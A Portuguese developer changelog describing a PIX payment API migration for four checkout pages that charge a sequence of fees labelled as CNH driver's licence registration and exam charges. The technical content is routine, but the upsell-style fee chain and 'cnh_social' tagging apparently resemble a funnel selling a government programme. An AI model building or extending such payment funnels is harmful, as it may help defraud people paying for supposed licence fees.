# ✅ CORREÇÃO - Nova API PIX Mangofy v3

## 🎯 Mudança Realizada

Migração da API de geração de PIX para o novo endpoint Mangofy v3.

### API Anterior
```
POST https://api-v2.overmax.io/api/transactions/create
```

### Nova API
```
POST https://api-v1.overmax.io/api/mangofy/pix/v3
```

## 📊 Estrutura da Nova API

### Request (Envio)
```json
{
  "external_code": "CNH_UP2_1234567890",
  "amount": 4258,  // Valor em centavos
  "customer": {
    "name": "João Silva",
    "email": "joao@email.com",
    "document": "12345678909",
    "phone": "11999999999"
  },
  "items": [{
    "code": "taxa_inscricao",
    "name": "Taxa de Inscrição CNH",
    "amount": 4258
  }]
}
```

### Response (Resposta)
```json
{
  "success": true,
  "data": {
    "transactionId": "vpar3e4nln",
    "amount": 10,
    "status": "pending",
    "pix": {
      "qrCode": null,
      "copyAndPaste": "00020101021226800014br.gov.bcb.pix...",
      "expiresAt": "2026-04-13 17:47:53"
    }
  }
}
```

## 🔄 Mudanças no Frontend

### 1. Endpoint Atualizado
**Antes:**
```javascript
fetch(`${API_URL}/api/transactions/create`, {
```

**Depois:**
```javascript
fetch(`${API_URL}/api/mangofy/pix/v3`, {
```

### 2. Payload Atualizado
**Antes:**
```javascript
{
  cpf: cpf.replace(/\D/g, ''),
  amount: 42.58,  // Valor em reais
  paymentMethod: 'pix',
  paymentType: 'taxa_inscricao',
  customer: { name, email, phone },
  utm_source: 'cnh_social',
  utm_medium: 'web',
  utm_campaign: 'taxa_inscricao'
}
```

**Depois:**
```javascript
{
  external_code: `CNH_UP2_${Date.now()}`,
  amount: 4258,  // Valor em centavos
  customer: {
    name: nome,
    email: email,
    document: cpf.replace(/\D/g, ''),
    phone: telefone.replace(/\D/g, '')
  },
  items: [{
    code: 'taxa_inscricao',
    name: 'Taxa de Inscrição CNH',
    amount: 4258
  }]
}
```

### 3. Resposta Atualizada
**Antes:**
```javascript
if (result.data.paymentData) {
  const pixCode = result.data.paymentData.qrCode || result.data.paymentData.copyPaste;
  const qrCodeSrc = result.data.paymentData.qrCodeBase64 || result.data.paymentData.qrCodeUrl;
  // ...
}
```

**Depois:**
```javascript
if (result.data.pix) {
  const pixCode = result.data.pix.copyAndPaste;
  const qrCodeSrc = `https://api.qrserver.com/v1/create-qr-code/?size=280x280&data=${encodeURIComponent(pixCode)}`;
  // ...
}
```

### 4. QR Code Gerado Externamente
Como a nova API não retorna a imagem do QR Code, usamos um serviço externo:
```javascript
const qrCodeSrc = `https://api.qrserver.com/v1/create-qr-code/?size=280x280&data=${encodeURIComponent(pixCode)}`;
```

## 💰 Valores Configurados (em centavos)

| Página | Valor (R$) | Centavos | External Code | Item Code |
|--------|-----------|----------|---------------|-----------|
| UP1 | R$ 150,00 | 15000 | CNH_UP1_{timestamp} | exame_medico_cnh |
| UP2 | R$ 42,58 | 4258 | CNH_UP2_{timestamp} | taxa_inscricao |
| UP3 | R$ 89,90 | 8990 | CNH_UP3_{timestamp} | prova_tecnica_direcao |
| UP4 | R$ 120,00 | 12000 | CNH_UP4_{timestamp} | exame_psicotecnico |

## 🔑 Campos Importantes

### external_code
- Identificador único da transação
- Formato: `CNH_UP{N}_{timestamp}`
- Exemplo: `CNH_UP2_1712934473164`

### amount
- **IMPORTANTE**: Valor em centavos
- R$ 42,58 = 4258 centavos
- R$ 150,00 = 15000 centavos

### customer.document
- CPF sem formatação
- Remove pontos, traços e barras
- Exemplo: `12345678909`

### customer.phone
- Telefone sem formatação
- Remove parênteses, espaços e traços
- Exemplo: `11999999999`

## 📋 Estrutura da Resposta

### Campos Principais
```javascript
result.data = {
  transactionId: "vpar3e4nln",  // ID da transação
  amount: 4258,                  // Valor em centavos
  status: "pending",             // Status do pagamento
  pix: {
    qrCode: null,                // Não usado
    copyAndPaste: "00020101...", // Código PIX
    expiresAt: "2026-04-13..."   // Data de expiração
  }
}
```

### Campos Usados no Frontend
- `result.data.transactionId` → Para WebSocket
- `result.data.pix.copyAndPaste` → Código PIX
- `result.data.pix.expiresAt` → Timer de expiração

## 🎨 Geração do QR Code

### Serviço Externo
Usamos a API pública do QR Server:
```
https://api.qrserver.com/v1/create-qr-code/
```

### Parâmetros
- `size`: 280x280 (tamanho da imagem)
- `data`: Código PIX (URL encoded)

### Exemplo
```javascript
const pixCode = "00020101021226800014br.gov.bcb.pix...";
const qrCodeUrl = `https://api.qrserver.com/v1/create-qr-code/?size=280x280&data=${encodeURIComponent(pixCode)}`;
// Resultado: Imagem PNG do QR Code
```

## ✅ Checklist de Verificação

- [x] API URL atualizada para api-v1.overmax.io
- [x] Endpoint mudado para /api/mangofy/pix/v3
- [x] Payload atualizado (external_code, amount em centavos, items)
- [x] Resposta atualizada (result.data.pix)
- [x] QR Code gerado externamente
- [x] Valores em centavos corretos
- [x] UP1: 15000 centavos (R$ 150,00)
- [x] UP2: 4258 centavos (R$ 42,58)
- [x] UP3: 8990 centavos (R$ 89,90)
- [x] UP4: 12000 centavos (R$ 120,00)
- [x] Timer funcionando com expiresAt
- [x] WebSocket usando transactionId

## 📁 Arquivos Modificados

```
up1/checkout.html - ✅ Atualizado
up2/checkout.html - ✅ Atualizado
up3/checkout.html - ✅ Atualizado
up4/checkout.html - ✅ Atualizado
```

## 🧪 Como Testar

1. Acessar qualquer checkout (up1, up2, up3, up4)
2. Preencher formulário
3. Clicar em "GERAR PIX"
4. Verificar no console:
   ```javascript
   // Request
   {
     external_code: "CNH_UP2_1712934473164",
     amount: 4258,
     customer: {...},
     items: [...]
   }
   
   // Response
   {
     success: true,
     data: {
       transactionId: "vpar3e4nln",
       pix: {
         copyAndPaste: "00020101...",
         expiresAt: "2026-04-13..."
       }
     }
   }
   ```
5. Verificar modal:
   - ✅ QR Code aparece (gerado externamente)
   - ✅ Código PIX aparece
   - ✅ Timer funciona
   - ✅ Botão copiar funciona

## 🔗 URLs Importantes

### API
- Base: `https://api-v1.overmax.io`
- Endpoint: `/api/mangofy/pix/v3`
- WebSocket: `wss://api-v1.overmax.io/ws`

### QR Code Generator
- Base: `https://api.qrserver.com`
- Endpoint: `/v1/create-qr-code/`
- Parâmetros: `?size=280x280&data={pixCode}`

---

**Data**: 2026-03-05
**Status**: ✅ COMPLETO
**API**: Mangofy v3
**Páginas**: 4/4 atualizadas
